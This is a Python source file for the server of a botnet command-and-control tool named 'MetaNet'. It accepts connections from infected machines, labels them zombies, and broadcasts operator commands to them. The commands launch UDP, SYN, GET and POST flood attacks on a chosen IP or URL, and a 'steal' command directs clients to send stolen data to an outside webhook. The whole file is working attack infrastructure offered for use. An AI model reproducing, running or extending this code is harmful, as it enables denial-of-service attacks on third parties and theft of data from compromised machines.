# Server
import os
import ctypes
import socket
import random
import colorama
import platform
import threading
from pystyle import Colors, Colorate, Center,Anime, Write, Box

# Server configuration
HOST = '0.0.0.0'
PORT = 5555

colorama.init(autoreset=True)

# Create a socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific address and port
server_socket.bind((HOST, PORT))

# Listen for incoming connections
server_socket.listen()

# List to store connected clients
clients = []
message_queue = []
output_messages = []
connected_clients_count = 0
clients_count_lock = threading.Lock()
color_list = [colorama.Fore.RED, colorama.Fore.GREEN, colorama.Fore.YELLOW, colorama.Fore.BLUE, colorama.Fore.MAGENTA, colorama.Fore.CYAN, colorama.Fore.LIGHTMAGENTA_EX]

os.system("title MetaNet")

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def banner():
    global connected_clients_count
    clear()
    x = '''
                 ╔╦╗┌─┐┌┬┐┌─┐╔╗╔┌─┐┌┬┐
                 ║║║├┤  │ ├─┤║║║├┤  │ 
                 ╩ ╩└─┘ ┴ ┴ ┴╝╚╝└─┘ ┴ 
       ╚══════╦════════════════════════╦══════╝
╔═════════════╩════════════════════════╩══════════════╗
║                                                     ║
║                ~ Welcome to MetaNet                 ║
║               ~ Developed by @7p4n1c                ║
║                                                     ║
╚═════════════════════════════════════════════════════╝

          Type "help" for the list of commands
    '''
    print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(x), 1))

def handle_client(client_socket, addr):
    global connected_clients_count
    with clients_count_lock:
        connected_clients_count += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"Metanet ({connected_clients_count})")
    try:
        while True:
            # Receive data from the client
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break  # Client disconnected

            if data == "Flood stopped":
                message_queue.append(f"Flood stopped by {addr[0]}:{addr[1]}")
            else:
                # Handle other messages from clients as needed
                pass
    except Exception as e:
        pass
    finally:
        with clients_count_lock:
            connected_clients_count -= 1
            ctypes.windll.kernel32.SetConsoleTitleW(f"Metanet ({connected_clients_count})")
            clients.remove(client_socket)
            client_socket.close()



def broadcast(message):
    # Send the message to all connected clients
    for client in clients:
        try:
            client.send(message.encode('utf-8'))
        except Exception as e:
            clients.remove(client)

# Function to continuously get user input and broadcast to clients
def send_messages():
    while True:
        message = Write.Input(text=Center.XCenter("User@MetaNet> ",spaces=32),color=Colors.red_to_blue,interval=0000.000015)
        print("")
        if message.lower() in ['list', 'ls']:
            client_info = [f'[{i+1}] {addr[0]}:{addr[1]}' for i, addr in enumerate(map(lambda x: x.getpeername()[0:2], clients))]
            if client_info:
                clear()
                print(Center.XCenter("""
                   Connected Client(s)
─══════════════════════════☆☆══════════════════════════─
                                 
"""))
                for zombie in client_info:
                    chosen_color = random.choice(color_list)
                    print(Center.XCenter(f"{chosen_color}{zombie}"))
            else:
                print(Center.XCenter(f"{colorama.Fore.RED}No Clients Connected"))

        elif str(message).lower() == "help":
            clear()
            x = '''
                ╔╦╗┌─┐┌┬┐┌─┐╔╗╔┌─┐┌┬┐
                ║║║├┤  │ ├─┤║║║├┤  │ 
                ╩ ╩└─┘ ┴ ┴ ┴╝╚╝└─┘ ┴ 
     ╚══════╦════════════════════════╦══════╝
╔═══════════╩════════════════════════╩══════════════╗
║      Usage: attack <Method> <IP> <Port> <Time>    ║
║═══════════════════════════════════════════════════║
║                [Help & Commands]                  ║
║                                                   ║
║        - Methods: udp, syn, get, post             ║
║        - banner: Displays main banner             ║
║        - ls: List connected client(s)             ║
║                                                   ║
║═══════════════════════════════════════════════════║
║                   Command Usage                   ║
║═══════════════════════════════════════════════════║
║              Steal: Steal <webhook>               ║
╚═══════════════════════════════════════════════════╝


            '''
            print(Colorate.Vertical(Colors.red_to_blue, Center.XCenter(x), 1))
 
        elif str(message) == "banner":
            banner()
        
        elif str(message).startswith("attack"):
            arguments = str(message).split()[1:]
            try:
                method = arguments[0]
                if method:
                    if method == "udp":
                        try:
                            ip = arguments[1]
                            port = int(arguments[2])  
                            sec = int(arguments[3])
                            if ip and port and sec:
                                broadcast(message)
                            else:
                                print("")
                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
                                print("")

                        except IndexError:
                            print("")
                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
                            print("")

                    elif method == "syn":
                        try:
                            ip = arguments[1]
                            port = int(arguments[2])  
                            sec = int(arguments[3])
                            if ip and port and sec:
                                broadcast(message)
                            else:
                                print("")
                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
                                print("")
                        except IndexError:
                            print("")
                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (IP, Port, Seconds)"))
                            print("")

                    elif method == "get":
                        try:
                            ip = arguments[1] 
                            sec = int(arguments[2])
                            if ip and sec:
                                broadcast(message)
                            else:
                                print("")
                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
                                print("")

                        except IndexError:
                            print("")
                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
                            print("")

                    elif method == "post":
                        try:
                            ip = arguments[1] 
                            sec = int(arguments[2])
                            if ip and sec:
                                broadcast(message)
                            else:
                                print("")
                                print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
                                print("")
                                
                        except IndexError:
                            print("")
                            print(Center.XCenter(f"{colorama.Fore.RED} Missing required arguments. (url, seconds)"))
                            print("")
                else:
                    print("")
                    print(Center.XCenter(f"{colorama.Fore.RED} Missing Method."))
                    print("")

            except IndexError:
                print("")
                print(Center.XCenter(f"{colorama.Fore.RED} Missing Method."))
                print("")
        
        elif str(message).startswith("steal"):
            arguments = str(message).split()[1:]
            try:
                if arguments[0]:
                    broadcast(message)
                else:
                    pass

            except IndexError:
                print(Center.XCenter(f"{colorama.Fore.RED} Missing URL."))
                print('')

        else:
            print("")
            print(Center.XCenter(f"{colorama.Fore.RED} Invalid Command."))
            print("")

# Function to continuously process messages from clients
def process_messages():
    while True:
        if message_queue:
            message = message_queue.pop(0)
            if not message.startswith("Flood stopped by"):
                output_messages.append(message)



x = '''
                      ╔╦╗┌─┐┌┬┐┌─┐╔╗╔┌─┐┌┬┐
                      ║║║├┤  │ ├─┤║║║├┤  │ 
                      ╩ ╩└─┘ ┴ ┴ ┴╝╚╝└─┘ ┴ 
           ╚══════╦════════════════════════╦══════╝
╔═════════════════╩════════════════════════╩══════════════════╗
║                               ______                        ║
║            |\_______________ (_____\\______________          ║
║    HH======#H###############H######################         ║
║            ' ~""""""""""""""`##(_))#H\"""""Y########         ║
║                              ))    \#H\       `"Y##         ║
║                              "      }#H)                    ║
║                                                             ║
║                    ~ Developed by @7p4n1c ~                 ║   
║                                                             ║
╚═════════════════════════════════════════════════════════════╝

'''


print(Anime.Fade(text=Center.Center(x), color=Colors.red_to_blue, mode=Colorate.Horizontal, interval=00.1, hide_cursor=True, time=3))

banner()


# Start a thread to handle user input and broadcasting
input_thread = threading.Thread(target=send_messages)
input_thread.start()

# Start a thread to handle messages from clients
message_thread = threading.Thread(target=process_messages)
message_thread.start()

# Accept and handle incoming connections
while True:
    client_socket, addr = server_socket.accept()
    clients.append(client_socket)

    # Create a thread to handle the client
    client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
    client_thread.start()
